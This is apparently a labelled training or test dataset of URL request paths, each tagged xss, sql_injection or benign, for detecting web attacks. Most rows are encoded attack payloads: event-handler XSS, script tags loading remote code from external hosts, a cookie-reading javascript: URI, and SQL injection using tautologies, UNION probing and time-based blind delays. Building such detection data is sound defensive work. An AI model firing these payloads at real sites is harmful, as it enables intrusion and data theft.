text,label
/v1/profile?bio=%3Cprogress+onmousemove%3D%22alert%281%29%22%3Etest%3C%2Fprogress%3E,xss
/api/v2/items/or%25201%3D1?key=API_KEY,sql_injection
/api/v1/feedback?message=%3CSCRIPT+a%3D%22%3E%22+%27%27+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E,xss
/v1/search?q=%3Caside+id%3Dx+tabindex%3D1+onactivate%3Dalert%281%29%3E%3C%2Faside%3E,xss
/api/v1/reviews?body=%3Csup+id%3Dx+tabindex%3D1+onbeforedeactivate%3Dalert%281%29%3E%3C%2Fsup%3E%3Cinput+autofocus%3E,xss
/api/v1/users?id=or+0%3D0+%C3%A2%E2%82%AC%E2%80%9C,sql_injection
/v1/profile?bio=%3Cpicture%3E%3Csource+srcset%3D%22validimage.png%22%3E%3Cimg+onloadend%3Dalert%281%29%3E%3C%2Fpicture%3E,xss
/api/v2/comments/%3Cbdi+onmouseleave%3D%22alert%281%29%22%3Etest%3C%2Fbdi%3E,xss
/v1/search?q=%3Cstyle%3E%3Atarget+%7Bcolor%3A+red%3B%7D%3C%2Fstyle%3E%3Cembed+id%3Dx+style%3D%22transition%3Acolor+10s%22+ontransitioncancel%3Dalert%281%29%3E%3C%2Fembed%3E,xss
/v1/search?q=%3Cheader+draggable%3D%22true%22+ondrag%3D%22alert%281%29%22%3Etest%3C%2Fheader%3E,xss
/api/v1/comments?text=%3Cstrike+id%3Dx+tabindex%3D1+onfocusin%3Dalert%281%29%3E%3C%2Fstrike%3E,xss
/api/v2/comments/%3Ccite+draggable%3D%22true%22+ondragend%3D%22alert%281%29%22%3Etest%3C%2Fcite%3E,xss
/v1/search?q=%3Carea+onmouseover%3D%22alert%281%29%22%3Etest%3C%2Farea%3E,xss
/v1/orders?customer_id=%26%26SLEEP%285%29--&status=active,sql_injection
/v1/profile?bio=%3Cul+oncut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Ful%3E,xss
/api/v2/search?q=%22%29%29+or+sleep%285%29%3D%22&key=API_KEY,sql_injection
/api/v1/login?username=%27+or+1%3D1+--&password=pass,sql_injection
/api/v2/comments/%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Cbgsound+style%3D%22animation-name%3Ax%22+onanimationstart%3D%22alert%281%29%22%3E%3C%2Fbgsound%3E,xss
/api/v2/profile?id=%3Ccol+oncut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fcol%3E,xss
/api/v1/feedback?message=%3Caudio+controls+autoplay+ontimeupdate%3Dalert%281%29%3E%3Csource+src%3D%22validaudio.wav%22+type%3D%22audio%2Fwav%22%3E%3C%2Faudio%3E,xss
/api/v1/users?id=%27%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%29%2520waitfor%2520delay%2520%270%3A0%3A20%27%2520%2F%2A,sql_injection
/api/v2/items/%27+or+username+like+char%2837%29%3B?key=API_KEY,sql_injection
/api/v1/reviews?body=%3Coption+onpaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Foption%3E,xss
/v1/search?q=%3Cthead+id%3Dx+tabindex%3D1+onfocus%3Dalert%281%29%3E%3C%2Fthead%3E,xss
/api/v1/reviews?body=%3Cstyle%3E%40keyframes+slidein+%7B%7D%3C%2Fstyle%3E%3Cframe+style%3D%22animation-duration%3A1s%3Banimation-name%3Aslidein%3Banimation-iteration-count%3A2%22+onanimationiteration%3D%22alert%281%29%22%3E%3C%2Fframe%3E,xss
/v1/search?q=%3Ccontent+onkeydown%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fcontent%3E,xss
/api/v1/comments?text=%3Crtc+onpaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Frtc%3E,xss
/api/v2/items/smart+watch?key=478988,benign
/api/v2/comments/%3Ccenter+onmousemove%3D%22alert%281%29%22%3Etest%3C%2Fcenter%3E,xss
/api/v2/profile?id=%3Chgroup+onmouseleave%3D%22alert%281%29%22%3Etest%3C%2Fhgroup%3E,xss
/v1/search?q=used%2Bcharger,benign
/api/v1/feedback?message=%3Cimg+id%3Dx+tabindex%3D1+onbeforedeactivate%3Dalert%281%29%3E%3C%2Fimg%3E%3Cinput+autofocus%3E,xss
/v1/products/admin%22+or+%221%22%3D%221,sql_injection
/v1/profile?bio=%3Cshadow+ondblclick%3D%22alert%281%29%22%3Etest%3C%2Fshadow%3E,xss
/api/v1/comments?text=%3Cnobr+ondblclick%3D%22alert%281%29%22%3Etest%3C%2Fnobr%3E,xss
/api/v1/feedback?message=%3Cpicture+onmouseout%3D%22alert%281%29%22%3Etest%3C%2Fpicture%3E,xss
/api/v2/profile?id=%3Ctime+id%3Dx+tabindex%3D1+onbeforeactivate%3Dalert%281%29%3E%3C%2Ftime%3E,xss
/v1/orders?customer_id=declare+%40s+varchar+%288000%29+select+%40s+%3D+0x73656c65637420404076657273696f6e&status=active,sql_injection
/api/v1/search?q=%27+--+,sql_injection
/api/v1/search?q=select+current_setting%28%27log_connections%27%29%3B,sql_injection
/api/v1/orders/620645,benign
/api/v1/reviews?body=%3Cdetails+onmousemove%3D%22alert%281%29%22%3Etest%3C%2Fdetails%3E,xss
/api/v1/users?id=UNION+ALL+SELECT+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16--,sql_injection
/api/v2/profile?id=%3Ctable+draggable%3D%22true%22+ondragleave%3D%22alert%281%29%22%3Etest%3C%2Ftable%3E,xss
/api/v1/comments?text=%3Cdir+draggable%3D%22true%22+ondragleave%3D%22alert%281%29%22%3Etest%3C%2Fdir%3E,xss
/api/v2/profile?id=%3Cdl+onkeypress%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fdl%3E,xss
/api/v2/profile?id=%3Cdata+oncontextmenu%3D%22alert%281%29%22%3Etest%3C%2Fdata%3E,xss
/v1/products/%22+or+0%3D0+--,sql_injection
/v1/profile?bio=%3Cdetails+onmouseenter%3D%22alert%281%29%22%3Etest%3C%2Fdetails%3E,xss
/api/v1/feedback?message=%3Cxmp+onmousemove%3D%22alert%281%29%22%3Etest%3C%2Fxmp%3E,xss
/api/v1/feedback?message=%3Cfooter+onmouseover%3D%22alert%281%29%22%3Etest%3C%2Ffooter%3E,xss
/api/v1/feedback?message=%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Chr+style%3D%22animation-name%3Ax%22+onanimationend%3D%22alert%281%29%22%3E%3C%2Fhr%3E,xss
/api/v2/profile?id=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Cdialog+ondragover%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Fdialog%3E,xss
/api/v1/reviews?body=%3Cnextid+draggable%3D%22true%22+ondrag%3D%22alert%281%29%22%3Etest%3C%2Fnextid%3E,xss
/v1/profile?bio=%3Crb+onclick%3D%22alert%281%29%22%3Etest%3C%2Frb%3E,xss
/v1/search?q=%3Cstyle%3E%3Atarget+%7Bcolor%3Ared%3B%7D%3C%2Fstyle%3E%3Coutput+id%3Dx+style%3D%22transition%3Acolor+1s%22+ontransitionend%3Dalert%281%29%3E%3C%2Foutput%3E,xss
/api/v1/comments?text=%3Cpre+onclick%3D%22alert%281%29%22%3Etest%3C%2Fpre%3E,xss
/api/v1/reviews?body=%3Clabel+onkeyup%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Flabel%3E,xss
/api/v2/profile?id=%3Ccaption+id%3Dx+tabindex%3D1+ondeactivate%3Dalert%281%29%3E%3C%2Fcaption%3E%3Cinput+id%3Dy+autofocus%3E,xss
/api/v1/reviews?body=%3Cimg+id%3Dx+tabindex%3D1+onfocus%3Dalert%281%29%3E%3C%2Fimg%3E,xss
/api/v1/comments?text=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Csub+ondrop%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Fsub%3E,xss
/api/v2/profile?id=%3Cstyle%3E%3Atarget+%7Bcolor%3Ared%3B%7D%3C%2Fstyle%3E%3Cvar+id%3Dx+style%3D%22transition%3Acolor+1s%22+ontransitionend%3Dalert%281%29%3E%3C%2Fvar%3E,xss
/api/v1/feedback?message=%3Cfigure+onpaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Ffigure%3E,xss
/api/v1/comments?text=%3Ccaption+onmouseenter%3D%22alert%281%29%22%3Etest%3C%2Fcaption%3E,xss
/v1/search?q=%3Csvg%3E%3Chgroup+onload%3Dalert%281%29%3E%3C%2Fhgroup%3E,xss
/api/v1/login?username=%27+group+by+userid+having+1%3D1--&password=pass,sql_injection
/api/v2/comments/%3Cbutton+onmouseenter%3D%22alert%281%29%22%3Etest%3C%2Fbutton%3E,xss
/v1/search?q=%3Cdiv+id%3D%22132%22%3E%3C%21doctype+html%3E,xss
/api/v1/search?q=ORDER+BY+1%2CSLEEP%285%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15--,sql_injection
/events/_doc/559573,benign
/api/v2/profile?id=%3Cinput+type%3Dradio+id%3Dx+onfocusin%3Dalert%281%29%3E,xss
/v1/search?q=%3Cstyle%3E%3Atarget+%7Bcolor%3Ared%3B%7D%3C%2Fstyle%3E%3Cmarquee+id%3Dx+style%3D%22transition%3Acolor+1s%22+ontransitionend%3Dalert%281%29%3E%3C%2Fmarquee%3E,xss
/v1/search?q=%3Cs+onmousemove%3D%22alert%281%29%22%3Etest%3C%2Fs%3E,xss
/v1/search?q=%3Capplet+oncut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fapplet%3E,xss
/api/v1/reviews?body=%3Clink+onmouseleave%3D%22alert%281%29%22%3Etest%3C%2Flink%3E,xss
/api/v2/comments/feed%3Ajavascript%3Aalert%28%27Top+Page+Location%3A+%27%2Bdocument.location%2B%27+Host+Page+Cookies%3A+%27%2Bdocument.cookie%29%3B%2F%2F%3Cbr%2F%3E%3Chr%2F%3E,xss
/api/v1/reviews?body=%3Cimage+onbeforecut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fimage%3E,xss
/api/v1/reviews?body=%3Cstyle%3E%3Atarget+%7Bcolor%3A+red%3B%7D%3C%2Fstyle%3E%3Ctrack+id%3Dx+style%3D%22transition%3Acolor+10s%22+ontransitioncancel%3Dalert%281%29%3E%3C%2Ftrack%3E,xss
/v1/search?q=%3Chead%3E%3Cstyle+type%3D%22text%2Fcss%22%3E%40font-face+%7Bfont-family%3A+y%3B+src%3A+url%28%22font.svg%23x%22%29+format%28%22svg%22%29%3B%7D+body+%7Bfont%3A+100px+%22y%22%3B%7D%3C%2Fstyle%3E%3C%2Fhead%3E,xss
/api/v1/reviews?body=%3Cmain+id%3Dx+tabindex%3D1+onbeforeactivate%3Dalert%281%29%3E%3C%2Fmain%3E,xss
/v1/search?q=%3Csamp+id%3Dx+tabindex%3D1+onactivate%3Dalert%281%29%3E%3C%2Fsamp%3E,xss
/v1/products/%22%2Bif%28benchmark%283000000%2CMD5%281%29%29%2CNULL%2CNULL%29%29%2520%2523,sql_injection
/api/v2/comments/%3Cstyle%3E%40keyframes+slidein+%7B%7D%3C%2Fstyle%3E%3Cbig+style%3D%22animation-duration%3A1s%3Banimation-name%3Aslidein%3Banimation-iteration-count%3A2%22+onanimationiteration%3D%22alert%281%29%22%3E%3C%2Fbig%3E,xss
/v1/profile?bio=%3Clisting+onfocusout%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Flisting%3E%3Cinput+autofocus%3E,xss
/v1/search?q=%3Cplaintext+oncopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fplaintext%3E,xss
/api/v2/comments/%3Cfooter+draggable%3D%22true%22+ondrag%3D%22alert%281%29%22%3Etest%3C%2Ffooter%3E,xss
/api/v1/feedback?message=%3Cmenuitem+onclick%3D%22alert%281%29%22%3Etest%3C%2Fmenuitem%3E,xss
/api/v1/reviews?body=%3Cbr+id%3Dx+tabindex%3D1+onbeforeactivate%3Dalert%281%29%3E%3C%2Fbr%3E,xss
/v1/profile?bio=%3CsCRIpt+x%3D%22%3E%22+src%3D%2F%2F15.rs%3E%3C%2Fscript%3E,xss
/2015-03-31/functions/func_5618/invocations,benign
/v1/search?q=%3Ccontent+onmousedown%3D%22alert%281%29%22%3Etest%3C%2Fcontent%3E,xss
/api/v1/profile?id=475683,benign
/api/v2/items/%22%2CNULL%29%2520waitfor%2520delay%2520%270%3A0%3A20%27%2520--?key=API_KEY,sql_injection
/v1/search?q=%3Cmain+draggable%3D%22true%22+ondragenter%3D%22alert%281%29%22%3Etest%3C%2Fmain%3E,xss
/api/v2/comments/%3Clegend+onkeypress%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Flegend%3E,xss
/v1/search?q=%3Cthead+onmouseup%3D%22alert%281%29%22%3Etest%3C%2Fthead%3E,xss
/api/v2/profile?id=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Cframeset+ondragover%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Fframeset%3E,xss
/api/v1/reviews?body=%3Clabel+onmouseleave%3D%22alert%281%29%22%3Etest%3C%2Flabel%3E,xss
/api/v1/login?username=%27%3B+if+not%28select+system_user%29+%3C%3E+%27sa%27+waitfor+delay+%270%3A0%3A2%27+--&password=pass,sql_injection
/api/v1/comments?text=%3Cstyle%3E%3Atarget+%7Btransform%3A+rotate%28180deg%29%3B%7D%3C%2Fstyle%3E%3Coutput+id%3Dx+style%3D%22transition%3Atransform+2s%22+ontransitionrun%3Dalert%281%29%3E%3C%2Foutput%3E,xss
/api/v2/comments/%3Cmeter+id%3Dx+tabindex%3D1+onbeforeactivate%3Dalert%281%29%3E%3C%2Fmeter%3E,xss
/v1/search?q=%3Cx%250Aonxxx%3D1,xss
/v1/orders?customer_id=%22&status=active,sql_injection
/api/v1/search?q=or+benchmark%2810000000%2CMD5%281%29%29%23,sql_injection
/api/v1/reviews?body=%3Cfont+oncontextmenu%3D%22alert%281%29%22%3Etest%3C%2Ffont%3E,xss
/api/v1/reviews?body=%3Cimage+draggable%3D%22true%22+ondragenter%3D%22alert%281%29%22%3Etest%3C%2Fimage%3E,xss
/v1/search?q=%3Cbody+onresize%3D%22alert%281%29%22%3E,xss
/api/v1/reviews?body=%3Cstyle%3E%40keyframes+x%7Bfrom+%7Bleft%3A0%3B%7Dto+%7Bleft%3A+1000px%3B%7D%7D%3Atarget+%7Banimation%3A10s+ease-in-out+0s+1+x%3B%7D%3C%2Fstyle%3E%3Cbasefont+id%3Dx+style%3D%22position%3Aabsolute%3B%22+onanimationcancel%3D%22alert%281%29%22%3E%3C%2Fbasefont%3E,xss
/api/v1/feedback?message=%3Cselect+draggable%3D%22true%22+ondragenter%3D%22alert%281%29%22%3Etest%3C%2Fselect%3E,xss
/v1/search?q=%3Clink+onkeypress%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Flink%3E,xss
/api/v2/comments/%3Csvg%3E%3Cdata+onload%3Dalert%281%29%3E%3C%2Fdata%3E,xss
/api/v1/comments?text=%3Cstyle%3E%3Atarget+%7Bcolor%3Ared%3B%7D%3C%2Fstyle%3E%3Ctrack+id%3Dx+style%3D%22transition%3Acolor+1s%22+ontransitionend%3Dalert%281%29%3E%3C%2Ftrack%3E,xss
/api/v1/comments?text=%3Cdetails+onmouseup%3D%22alert%281%29%22%3Etest%3C%2Fdetails%3E,xss
/v1/products/%27%3Bwaitfor+delay+%270%3A0%3A__TIME__%27--,sql_injection
/api/v2/comments/%3Carea+onmousemove%3D%22alert%281%29%22%3Etest%3C%2Farea%3E,xss
/api/v2/profile?id=%3Cshadow+onmouseenter%3D%22alert%281%29%22%3Etest%3C%2Fshadow%3E,xss
/api/v1/feedback?message=%3Csvg%3E%3Cdel+onload%3Dalert%281%29%3E%3C%2Fdel%3E,xss
/api/v1/search?q=%22%29+and+0%3Dbenchmark%283000000%2CMD5%281%29%29%2520--,sql_injection
/api/v1/reviews?body=%3Ccite+draggable%3D%22true%22+ondrag%3D%22alert%281%29%22%3Etest%3C%2Fcite%3E,xss
/v1/search?q=%3Cprogress+onbeforecopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fprogress%3E,xss
/api/v2/items/%2Bif%28benchmark%283000000%2CMD5%281%29%29%2CNULL%2CNULL%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%29%2520%2523?key=API_KEY,sql_injection
/api/v1/feedback?message=%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Cmap+style%3D%22animation-name%3Ax%22+onanimationstart%3D%22alert%281%29%22%3E%3C%2Fmap%3E,xss
/api/v1/reviews?body=%3Cb+onkeypress%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fb%3E,xss
/v1/projects/proj-3511/locations/asia-east1/datasets/ds_7753,benign
/api/v1/search?q=--sp_password,sql_injection
/api/v2/profile?id=%3Carea+draggable%3D%22true%22+ondrag%3D%22alert%281%29%22%3Etest%3C%2Farea%3E,xss
/api/v2/items/AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2873%29%2BCHAR%2878%29%2BCHAR%2874%29%2BCHAR%2869%29%2BCHAR%2867%29%2BCHAR%2884%29%2BCHAR%2888%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%2880%29%2BCHAR%2875%29%2BCHAR%28116%29%2BCHAR%2869%29%2BCHAR%2865%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28106%29%2BCHAR%28107%29%29%29--?key=API_KEY,sql_injection
/api/v2/profile?id=%3Ccolgroup+onclick%3D%22alert%281%29%22%3Etest%3C%2Fcolgroup%3E,xss
/api/v1/comments?text=%3Clegend+id%3Dx+tabindex%3D1+onactivate%3Dalert%281%29%3E%3C%2Flegend%3E,xss
/v1/search?q=%3Cmulticol+draggable%3D%22true%22+ondragleave%3D%22alert%281%29%22%3Etest%3C%2Fmulticol%3E,xss
/api/v2/search?q=AK-XY-999&key=590580,benign
/v1/search?q=%3Cimage+onbeforepaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fimage%3E,xss
/api/v1/feedback?message=%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Caside+style%3D%22animation-name%3Ax%22+onanimationend%3D%22alert%281%29%22%3E%3C%2Faside%3E,xss
/api/v1/feedback?message=%3Cstyle%3E%3Atarget+%7Bcolor%3Ared%3B%7D%3C%2Fstyle%3E%3Cbasefont+id%3Dx+style%3D%22transition%3Acolor+1s%22+ontransitionend%3Dalert%281%29%3E%3C%2Fbasefont%3E,xss
/api/v1/profile?id=42459,benign
/api/v1/login?username=%27%2CNULL%2CNULL%2CNULL%29%2520waitfor%2520delay%2520%270%3A0%3A20%27%2520--&password=pass,sql_injection
/api/v2/items/%22%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%29%2520waitfor%2520delay%2520%270%3A0%3A20%27%2520%2F%2A?key=API_KEY,sql_injection
/api/v1/feedback?message=%3Csamp+id%3Dx+tabindex%3D1+onbeforedeactivate%3Dalert%281%29%3E%3C%2Fsamp%3E%3Cinput+autofocus%3E,xss
/api/v1/feedback?message=%3Cth+draggable%3D%22true%22+ondragenter%3D%22alert%281%29%22%3Etest%3C%2Fth%3E,xss
/api/v1/search?q=UNION+ALL+SELECT+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%2C27,sql_injection
/api/v2/comments/%3Csvg+onbeforecut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fsvg%3E,xss
/api/v2/comments/%3Ccol+onpaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fcol%3E,xss
/v1/profile?bio=%3Cinput+onkeypress%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Finput%3E,xss
/v1/profile?bio=%3Caudio+draggable%3D%22true%22+ondragenter%3D%22alert%281%29%22%3Etest%3C%2Faudio%3E,xss
/v1/profile?bio=%3Cp+oncut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fp%3E,xss
/api/v2/profile?id=%3Crb+ondblclick%3D%22alert%281%29%22%3Etest%3C%2Frb%3E,xss
/v1/products/ORDER+BY+17--,sql_injection
/api/v1/feedback?message=%3Cstyle%3E%3Atarget+%7Bcolor%3Ared%3B%7D%3C%2Fstyle%3E%3Ctitle+id%3Dx+style%3D%22transition%3Acolor+1s%22+ontransitionend%3Dalert%281%29%3E%3C%2Ftitle%3E,xss
/api/v2/profile?id=%3Csvg+draggable%3D%22true%22+ondragend%3D%22alert%281%29%22%3Etest%3C%2Fsvg%3E,xss
/api/v1/comments?text=%3Cthead+onfocusout%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Fthead%3E%3Cinput+autofocus%3E,xss
/api/v1/reviews?body=%3Cstyle%3E%3Atarget+%7Btransform%3A+rotate%28180deg%29%3B%7D%3C%2Fstyle%3E%3Caddress+id%3Dx+style%3D%22transition%3Atransform+2s%22+ontransitionrun%3Dalert%281%29%3E%3C%2Faddress%3E,xss
/api/v2/profile?id=%3Chtml+id%3Dx+tabindex%3D1+onbeforeactivate%3Dalert%281%29%3E%3C%2Fhtml%3E,xss
/v1/profile?bio=%3Cdiv+id%3Dx+tabindex%3D1+onfocusin%3Dalert%281%29%3E%3C%2Fdiv%3E,xss
/v1/search?q=%3Cbutton+draggable%3D%22true%22+ondragleave%3D%22alert%281%29%22%3Etest%3C%2Fbutton%3E,xss
/v1/search?q=%3Csamp+draggable%3D%22true%22+ondrag%3D%22alert%281%29%22%3Etest%3C%2Fsamp%3E,xss
/api/v1/feedback?message=%3Csvg+id%3Dx+tabindex%3D1+onbeforeactivate%3Dalert%281%29%3E%3C%2Fsvg%3E,xss
/api/v1/reviews?body=%3Clisting+id%3Dx+tabindex%3D1+onbeforedeactivate%3Dalert%281%29%3E%3C%2Flisting%3E%3Cinput+autofocus%3E,xss
/api/v1/comments?text=%3Cruby+draggable%3D%22true%22+ondragleave%3D%22alert%281%29%22%3Etest%3C%2Fruby%3E,xss
/api/v1/user/APIKEY123,benign
/api/v1/search?q=%C3%83%C6%92%C3%82%C2%BD+or+1%3D1+--,sql_injection
/v1/orders?customer_id=UNION+ALL+SELECT+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26--&status=active,sql_injection
/v1/search?q=%3Cli+onkeypress%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fli%3E,xss
/api/v1/comments?text=%3Cnoembed+onfocusout%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Fnoembed%3E%3Cinput+autofocus%3E,xss
/api/v1/orders/172950,benign
/api/v1/login?username=admin%27+or+%27&password=pass,sql_injection
/api/v1/reviews?body=%3Clink+id%3Dx+tabindex%3D1+onbeforeactivate%3Dalert%281%29%3E%3C%2Flink%3E,xss
/api/v2/profile?id=%3Csvg%3E%3Cdd+onload%3Dalert%281%29%3E%3C%2Fdd%3E,xss
/v1/search?q=%3Ckbd+draggable%3D%22true%22+ondragleave%3D%22alert%281%29%22%3Etest%3C%2Fkbd%3E,xss
/api/v1/login?username=1%5C%271&password=pass,sql_injection
/api/v2/profile?id=%3Ccanvas+onbeforepaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fcanvas%3E,xss
/v1/profile?bio=%2A%7Bbackground%3Aurl%28xx%3Ax+%2F%2F%2A%2A%2F%5Cred%2F%2A%29%7D+%2F%2A+IE+6-7+Standards+mode+%2A%2F,xss
/api/v1/users?id=WHERE+1%3D1+AND+1%3D0--,sql_injection
/api/v2/comments/%3Cnextid+onkeyup%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fnextid%3E,xss
/v1/profile?bio=%3Cbase+onmousedown%3D%22alert%281%29%22%3Etest%3C%2Fbase%3E,xss
/api/v1/login?username=%257C&password=pass,sql_injection
/api/v1/search?q=ORDER+BY+2--,sql_injection
/v1/search?q=%3Cstrong+draggable%3D%22true%22+ondragstart%3D%22alert%281%29%22%3Etest%3C%2Fstrong%3E,xss
/api/v2/comments/%3Crp+onkeypress%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Frp%3E,xss
/api/v1/reviews?body=%3Cframe+onmouseenter%3D%22alert%281%29%22%3Etest%3C%2Fframe%3E,xss
/api/v1/comments?text=%3Ca+draggable%3D%22true%22+ondragend%3D%22alert%281%29%22%3Etest%3C%2Fa%3E,xss
/v1/profile?bio=%3Cstyle%3E%40keyframes+x%7Bfrom+%7Bleft%3A0%3B%7Dto+%7Bleft%3A+1000px%3B%7D%7D%3Atarget+%7Banimation%3A10s+ease-in-out+0s+1+x%3B%7D%3C%2Fstyle%3E%3Crtc+id%3Dx+style%3D%22position%3Aabsolute%3B%22+onanimationcancel%3D%22alert%281%29%22%3E%3C%2Frtc%3E,xss
/v1/search?q=%3CSCRIPT+a%3D%22%3E%22+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E,xss
/v1/search?q=%3Cnoframes+oncopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fnoframes%3E,xss
/api/v1/comments?text=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Ccontent+ondragover%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Fcontent%3E,xss
/repos/alice/backend/issues,benign
/api/v2/comments/%3Cstyle+id%3Dx+tabindex%3D1+onfocusin%3Dalert%281%29%3E%3C%2Fstyle%3E,xss
/v1/profile?bio=%3Cstyle%3E%40keyframes+slidein+%7B%7D%3C%2Fstyle%3E%3Ccanvas+style%3D%22animation-duration%3A1s%3Banimation-name%3Aslidein%3Banimation-iteration-count%3A2%22+onanimationiteration%3D%22alert%281%29%22%3E%3C%2Fcanvas%3E,xss
/api/v1/feedback?message=%3Cstyle%3E%3Atarget+%7Bcolor%3A+red%3B%7D%3C%2Fstyle%3E%3Cfigure+id%3Dx+style%3D%22transition%3Acolor+10s%22+ontransitioncancel%3Dalert%281%29%3E%3C%2Ffigure%3E,xss
/api/v2/comments/%3Cbutton+onpaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fbutton%3E,xss
/api/v1/feedback?message=%3Cisindex+oncopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fisindex%3E,xss
/api/v1/feedback?message=%3Csub+id%3Dx+tabindex%3D1+onfocusin%3Dalert%281%29%3E%3C%2Fsub%3E,xss
/api/v2/comments/%3Cstyle%3E%3Atarget+%7Btransform%3A+rotate%28180deg%29%3B%7D%3C%2Fstyle%3E%3Cshadow+id%3Dx+style%3D%22transition%3Atransform+2s%22+ontransitionrun%3Dalert%281%29%3E%3C%2Fshadow%3E,xss
/v1/profile?bio=%3Ctt+onbeforepaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Ftt%3E,xss
/api/v2/profile?id=%3Cblockquote+oncut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fblockquote%3E,xss
/v1/profile?bio=%3Csvg%3E%3Cset+onrepeat%3Dalert%281%29+attributename%3Dx+dur%3D1s+repeatcount%3D2%3E,xss
